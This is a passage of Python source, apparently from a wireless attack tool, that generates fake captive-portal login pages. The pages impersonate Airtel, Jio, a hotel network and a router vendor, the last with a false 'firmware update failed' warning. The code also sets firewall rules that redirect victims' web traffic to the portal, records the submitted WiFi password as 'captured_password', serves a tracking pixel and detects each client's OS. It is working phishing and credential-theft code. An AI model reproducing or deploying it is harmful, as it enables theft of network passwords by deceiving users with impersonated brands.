.airtel-card{{background:#fff;border-radius:16px;padding:32px 28px;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.12)}}
.airtel-logo{{text-align:center;margin-bottom:20px}}
.airtel-logo span{{font-size:28px;font-weight:800;color:#e53935;letter-spacing:-0.5px}}
.airtel-logo small{{display:block;font-size:12px;color:#888;margin-top:2px}}
.airtel-btn{{background:#e53935;color:#fff;border:none;border-radius:8px;padding:14px;width:100%;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}}
.airtel-btn:hover{{background:#c62828}}
.airtel-link{{color:#e53935;font-size:13px;text-decoration:none}}
</style>
</head><body>
<div class="airtel-bg"><div class="airtel-card">
<div class="airtel-logo"><span>airtel</span><small>Airtel WiFi - Secure Login</small></div>
<h2 style="text-align:center;font-size:18px;color:#333;margin-bottom:6px">Welcome to Airtel WiFi</h2>
<p style="text-align:center;font-size:14px;color:#666;margin-bottom:20px">Sign in with your Airtel WiFi password to access the internet</p>
<form action="/" method="post">
<label style="color:#555;font-weight:600;font-size:14px;margin-bottom:4px;display:block">WiFi Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter your WiFi password" required autofocus style="border:1.5px solid #ddd;border-radius:8px;padding:13px 14px;width:100%;font-size:16px;margin-bottom:8px;box-sizing:border-box">
{error_html}
<button type="submit" class="airtel-btn">Sign In</button>
</form>
<p style="text-align:center;font-size:12px;color:#999;margin-top:18px">By signing in, you agree to the <a href="#" class="airtel-link">Terms of Service</a> and <a href="#" class="airtel-link">Privacy Policy</a></p>
<div style="text-align:center;margin-top:16px;padding-top:14px;border-top:1px solid #eee">
<p style="font-size:11px;color:#aaa;margin:0">Secure connection powered by Airtel</p>
<p style="font-size:11px;color:#ccc;margin:4px 0 0 0">&copy; 2024 Bharti Airtel Ltd. All rights reserved.</p>
</div>
</div></div></body></html>"""

        # ---- Template 2b: Jio ISP Portal ----
        if variant == "jio":
            return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Jio WiFi - Sign In</title>
<style>{css}
.jio-bg{{background:linear-gradient(135deg,#0a3d91 0%,#1565c0 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.jio-card{{background:#fff;border-radius:16px;padding:32px 28px;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.12)}}
.jio-logo{{text-align:center;margin-bottom:20px}}
.jio-logo span{{font-size:32px;font-weight:800;color:#0a3d91;letter-spacing:-1px}}
.jio-logo small{{display:block;font-size:12px;color:#888;margin-top:2px}}
.jio-btn{{background:#0a3d91;color:#fff;border:none;border-radius:8px;padding:14px;width:100%;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}}
.jio-btn:hover{{background:#082f6e}}
.jio-link{{color:#0a3d91;font-size:13px;text-decoration:none}}
</style>
</head><body>
<div class="jio-bg"><div class="jio-card">
<div class="jio-logo"><span>Jio</span><small>Jio AirFiber - Secure WiFi</small></div>
<h2 style="text-align:center;font-size:18px;color:#333;margin-bottom:6px">Welcome to Jio WiFi</h2>
<p style="text-align:center;font-size:14px;color:#666;margin-bottom:20px">Enter your Jio AirFiber WiFi password to get connected</p>
<form action="/" method="post">
<label style="color:#555;font-weight:600;font-size:14px;margin-bottom:4px;display:block">WiFi Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter your WiFi password" required autofocus style="border:1.5px solid #ddd;border-radius:8px;padding:13px 14px;width:100%;font-size:16px;margin-bottom:8px;box-sizing:border-box">
{error_html}
<button type="submit" class="jio-btn">Connect</button>
</form>
<p style="text-align:center;font-size:12px;color:#999;margin-top:18px">By connecting, you agree to our <a href="#" class="jio-link">Terms of Use</a> and <a href="#" class="jio-link">Privacy Policy</a></p>
<div style="text-align:center;margin-top:16px;padding-top:14px;border-top:1px solid #eee">
<p style="font-size:11px;color:#aaa;margin:0">Powered by Jio AirFiber</p>
<p style="font-size:11px;color:#ccc;margin:4px 0 0 0">&copy; 2024 Reliance Jio Infocomm Ltd. All rights reserved.</p>
</div>
</div></div></body></html>"""

        # ---- Template 3: Hotel/Airport WiFi ----
        if variant == "hotel":
            return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Guest WiFi - Free Internet Access</title>
<style>{css}
.hotel-bg{{background:linear-gradient(180deg,#f8f9fa 0%,#e9ecef 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.hotel-card{{background:#fff;border-radius:16px;padding:36px 28px;max-width:420px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,0.08);text-align:center}}
.hotel-icon{{width:64px;height:64px;background:linear-gradient(135deg,#2196F3,#1565c0);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}}
.hotel-icon svg{{width:32px;height:32px;fill:#fff}}
.hotel-btn{{background:#2196F3;color:#fff;border:none;border-radius:8px;padding:14px;width:100%;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}}
.hotel-btn:hover{{background:#1565c0}}
.hotel-link{{color:#2196F3;font-size:13px;text-decoration:none}}
</style>
</head><body>
<div class="hotel-bg"><div class="hotel-card">
<div class="hotel-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></div>
<h2 style="font-size:20px;color:#1a1a1a;margin-bottom:4px">Free Guest WiFi</h2>
<p style="font-size:14px;color:#666;margin-bottom:22px">Enter the WiFi password provided at reception to connect</p>
<form action="/" method="post">
<label style="text-align:left;color:#555;font-weight:600;font-size:14px;margin-bottom:4px;display:block">WiFi Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter WiFi password" required autofocus style="border:1.5px solid #ddd;border-radius:8px;padding:13px 14px;width:100%;font-size:16px;margin-bottom:8px;box-sizing:border-box">
{error_html}
<button type="submit" class="hotel-btn">Connect to WiFi</button>
</form>
<p style="font-size:12px;color:#999;margin-top:18px;line-height:1.5">By connecting you agree to the <a href="#" class="hotel-link">Acceptable Use Policy</a>. This network is monitored for security.</p>
<div style="margin-top:20px;padding-top:14px;border-top:1px solid #eee">
<p style="font-size:11px;color:#bbb;margin:0">&copy; 2024 Hotel WiFi Network &mdash; Authorized Use Only</p>
</div>
</div></div></body></html>"""

        # ---- Template 4: Generic Router Manufacturer Update ----
        if variant == "generic_router":
            manufacturer = self.config.router_manufacturer.strip() or "Router"
            safe_manufacturer = html.escape(manufacturer)
            return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{safe_manufacturer} - Firmware Update</title>
<style>{css}
.gen-nav{{background:linear-gradient(135deg,#2c3e50 0%,#34495e 100%);color:#fff;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;font-family:Arial,sans-serif}}
.gen-nav .brand{{font-size:18px;font-weight:700;letter-spacing:-0.3px}}
.gen-nav .version{{font-size:11px;opacity:.7}}
.gen-body{{font-family:Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.gen-card{{background:#fff;border-radius:12px;padding:32px 28px;max-width:440px;width:100%;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
.gen-logo{{display:flex;align-items:center;gap:14px;margin-bottom:20px}}
.gen-logo .icon{{width:48px;height:48px;background:linear-gradient(135deg,#3498db,#2980b9);border-radius:10px;display:flex;align-items:center;justify-content:center}}
.gen-logo .icon svg{{width:26px;height:26px;fill:#fff}}
.gen-logo .text h2{{margin:0;font-size:17px;color:#2c3e50}}
.gen-logo .text small{{color:#888;font-size:12px}}
.gen-warning{{border-left:4px solid #f39c12;background:#fef9e7;border-radius:4px;padding:14px 16px;margin-bottom:20px}}
.gen-warning h3{{margin:0 0 4px;font-size:15px;color:#e67e22}}
.gen-warning p{{margin:0;font-size:13px;color:#7f6c00;line-height:1.5}}
.gen-form label{{color:#555;font-weight:600;font-size:14px;margin-bottom:4px;display:block}}
.gen-form input{{border:1.5px solid #ddd;border-radius:8px;padding:13px 14px;width:100%;font-size:16px;margin-bottom:8px;box-sizing:border-box}}
.gen-form input:focus{{outline:none;border-color:#3498db}}
.gen-btn{{width:100%;background:#3498db;color:#fff;border:none;border-radius:8px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}}
.gen-btn:hover{{background:#2980b9}}
.gen-status{{background:#f8f9fa;border-radius:6px;padding:12px 14px;margin-top:18px;font-size:12px;color:#666}}
.gen-status strong{{color:#333}}
.gen-footer{{text-align:center;margin-top:20px;padding-top:14px;border-top:1px solid #eee;font-size:11px;color:#bbb}}
</style>
</head><body>
<div style="position:absolute;top:0;left:0;right:0">
<div class="gen-nav">
<div class="brand">{safe_manufacturer}</div>
<div class="version">Firmware v3.2.1 Build 20241220</div>
</div>
</div>
<div class="gen-body">
<div class="gen-card">
<div class="gen-logo">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-4-4 1.41-1.41L11 12.17l6.59-6.59L19 7l-8 8z"/></svg></div>
<div class="text">
<h2>{safe_manufacturer} Router Login</h2>
<small>Firmware: 3.2.1 Build 20241220 &mdash; {safe_essid}</small>
</div>
</div>
<div class="gen-warning">
<h3>Firmware Update Failed</h3>
<p>A critical security firmware update failed to apply. Your network access has been temporarily restricted until the firmware is verified. Enter your WiFi password below to complete the update and restore connectivity.</p>
</div>
<p style="font-size:14px;color:#555;margin-bottom:16px"><strong>Action Required:</strong> Your router needs to verify your WiFi credentials before applying the pending firmware update.</p>
<form action="/" method="post" class="gen-form">
<label>WiFi Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter your WiFi password" required autofocus>
{error_html}
<button type="submit" class="gen-btn">Restore Network Connection</button>
</form>
<div class="gen-status">Network: <strong>{safe_essid}</strong> &mdash; Firmware update requires manual password verification.</div>
<div class="gen-footer">&copy; 2024 {safe_manufacturer} &mdash; All rights reserved.</div>
</div></div></body></html>"""

        # ---- Fallback: Generic (password) ----
        return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Login</title>
<style>{css}</style>
</head><body>
<div class="container"><div class="card" style="margin-top:24px">
<h2>Network Access Required</h2>
<p>Enter the wireless password for <strong>{safe_essid}</strong> to gain internet access.</p>
<form action="/" method="post">
<label>Wireless Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter network password" required autofocus>
{error_html}
<button type="submit" class="btn btn-green">Connect</button>
</form>
</div>
<div class="footer">&copy; 2024 Network Administrator</div>
</div></body></html>"""

    def _generate_success_html(self, client_ip: str, detected_os: DetectedOS, password: str) -> str:
        return """<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width">
<script>setTimeout(function(){window.close();},2000);</script>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#4CAF50;color:white}</style>
</head><body>
<h1 style="font-size:3em">&#10003;</h1>
<h2>Credentials Verified</h2>
<p style="font-size:18px;font-weight:bold">Firmware Updated Successfully!</p>
<p>You can use your network now.</p>
<p style="font-size:14px;margin-top:30px">This window will close in 2 seconds...</p>
</body></html>"""

    def _generate_received_html(self, client_ip: str, detected_os: DetectedOS) -> str:
        return """<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width">
<script>setTimeout(function(){window.location.href='/';},4000);</script>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#4CAF50;color:white}</style>
</head><body>
<h1 style="font-size:3em">&#10003;</h1>
<h2>Credentials Received</h2>
<p>Your network password has been recorded.</p>
<p style="font-size:14px;margin-top:30px">Redirecting in 4 seconds...</p>
</body></html>"""

    def _generate_failure_html(self, client_ip: str, detected_os: DetectedOS) -> str:
        return """<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width">
<script>setTimeout(function(){window.location.href='/';},4000);</script>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f44336;color:white}</style>
</head><body>
<h1 style="font-size:3em">&#10007;</h1>
<h2>Incorrect Password</h2>
<p>The password you entered is incorrect. Please try again.</p>
<p style="font-size:14px">Redirecting in 4 seconds...</p>
</body></html>"""

    def _generate_portal_html(self, path: str, client_ip: str, detected_os: DetectedOS) -> str:
        safe_title = html.escape(self.config.portal_title)
        safe_message = html.escape(self.config.portal_message)
        safe_essid = html.escape(self.config.essid)

        mode_content = ""
        if self.config.portal_mode == PortalMode.CAPTIVE:
            mode_content = """
            <div class="warning">
                <p><strong>Captive Portal Detected</strong></p>
                <p>This network requires authorization to proceed.</p>
            </div>
            """
        elif self.config.portal_mode == PortalMode.NOTICE:
            mode_content = """
            <div class="status">
                <p><strong>Network Notice</strong></p>
                <p>You are connected to this network.</p>
            </div>
            """

        return f"""<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>{self._get_css()}</style>
</head><body><nav><b>{safe_essid}</b></nav><div class="container">
<div class="card">
<h2>{safe_title}</h2>
<p style="font-size:16px;line-height:1.6;margin-bottom:20px">{safe_message}</p>
{mode_content}
</div>
</div></body></html>"""

    # -------------------------------------------------------------------------
    # Tracking Pixel
    # -------------------------------------------------------------------------

    def _create_tracking_pixel(self) -> None:
        pixel_data = base64.b64decode(TRACKING_PIXEL_B64)
        with open(self._tracking_pixel_path, "wb") as f:
            f.write(pixel_data)

    async def _serve_tracking_pixel(self, writer: asyncio.StreamWriter) -> None:
        try:
            with open(self._tracking_pixel_path, "rb") as f:
                pixel_data = f.read()
            self.stats.tracking_pixel_requests += 1
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: image/png\r\n"
                f"Content-Length: {len(pixel_data)}\r\n"
                "Cache-Control: no-store, no-cache, must-revalidate\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            writer.write(response.encode())
            writer.write(pixel_data)
            await writer.drain()
        except Exception as e:
            logger.debug("Failed to serve tracking pixel: %s", e)

    # -------------------------------------------------------------------------
    # Firewall Rules
    # -------------------------------------------------------------------------

    async def _setup_firewall(self, safe_log: Callable) -> None:
        if shutil.which("iptables") is None and shutil.which("nft") is None:
            self.health.failures.append("no firewall backend available")
            await safe_log("[!] Neither iptables nor nft found; firewall rules not applied")
            return
        if shutil.which("nft") is not None and os.path.exists("/usr/sbin/nft"):
            await self._setup_nftables(safe_log)
        else:
            await self._setup_iptables(safe_log)

    async def _setup_iptables(self, safe_log: Callable) -> None:
        rules = [
            ["iptables", "-A", "INPUT", "-m", "state", "--state", "ESTABLISHED,RELATED", "-j", "ACCEPT"],
            ["iptables", "-A", "INPUT", "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
            ["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(self.config.portal_port), "-j", "ACCEPT"],
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.config.tap_iface,
             "-p", "tcp", "--dport", "80",
             "-j", "DNAT", "--to-destination", f"{self.config.gateway_ip}:{self.config.portal_port}"],
            ["iptables", "-A", "INPUT", "-i", self.config.tap_iface, "-j", "ACCEPT"],
        ]
        redirect_success = self.config.portal_port == 80
        for rule in rules:
            result = await self.mgr.run(rule, timeout=5.0, check=False)
            if result.success:
                self._firewall_rules.append(" ".join(rule))
                if "-t" in rule and "nat" in rule:
                    redirect_success = True
            else:
                detail = (result.stderr or result.stdout or "").strip()
                self.health.failures.append(f"firewall rule failed: {' '.join(rule)}")
                await safe_log(f"[!] Firewall rule failed: {' '.join(rule)}" + (f" ({detail})" if detail else ""))
        self.health.firewall_active = bool(self._firewall_rules)
        self.health.firewall_redirect_active = redirect_success
        await safe_log(f"[+] Firewall rules applied ({len(self._firewall_rules)} rules)")

    async def _setup_nftables(self, safe_log: Callable) -> None:
        nft_config = f"""
table ip swcli_portal {{
    chain input {{
        type filter hook input priority 0; policy accept;
        ct state established,related accept
        udp dport 53 accept
        tcp dport {self.config.portal_port} accept
        iifname "{self.config.tap_iface}" accept
    }}
    chain prerouting {{
        type nat hook prerouting priority -100;
        iifname "{self.config.tap_iface}" tcp dport 80 dnat to {self.config.gateway_ip}:{self.config.portal_port}
    }}
}}
"""
        config_path = os.path.join(self._temp_dir, "nftables.conf")
        with open(config_path, "w") as f:
            f.write(nft_config)
        result = await self.mgr.run(["nft", "-f", config_path], timeout=5.0, check=False)
        if result.success:
            self._firewall_rules.append("nftables table swcli_portal")
            self.health.firewall_active = True
            self.health.firewall_redirect_active = True
            await safe_log("[+] nftables rules applied")
        else:
            detail = (result.stderr or result.stdout or "").strip()
            self.health.failures.append("nftables rules failed")
            await safe_log("[!] nftables rules failed" + (f": {detail}" if detail else ""))

    async def _remove_firewall_rules(self) -> None:
        if not self._firewall_rules:
            return
        if shutil.which("nft") is not None:
            await self.mgr.run(["nft", "delete", "table", "ip", "swcli_portal"], timeout=5.0, check=False)
        if shutil.which("iptables") is not None:
            for tracked_rule in reversed(self._firewall_rules):
                if not tracked_rule.startswith("iptables "):
                    continue
                rule = tracked_rule.split(" ")
                if "-A" in rule:
                    rule[rule.index("-A")] = "-D"
                await self.mgr.run(rule, timeout=5.0, check=False)
        self._firewall_rules.clear()

    # -------------------------------------------------------------------------
    # Utility Methods
    # -------------------------------------------------------------------------

    def get_stats_summary(self) -> dict:
        return {
            "mode": self.config.portal_mode.value,
            "portal_hits": self.stats.portal_hits,
            "tracking_pixel_requests": self.stats.tracking_pixel_requests,
            "unique_clients": len(self.stats.detected_os),
            "password_attempts": len(self.stats.password_attempts),
            "password_found": self.stats.password_found,
            "captured_password": self.stats.captured_password,
            "os_distribution": self._get_os_distribution(),
            "recent_requests": self.stats.portal_requests[-10:],
        }

    def _get_os_distribution(self) -> dict[str, int]:
        distribution: dict[str, int] = {}
        for os_type in self.stats.detected_os.values():
            distribution[os_type.value] = distribution.get(os_type.value, 0) + 1
        return distribution
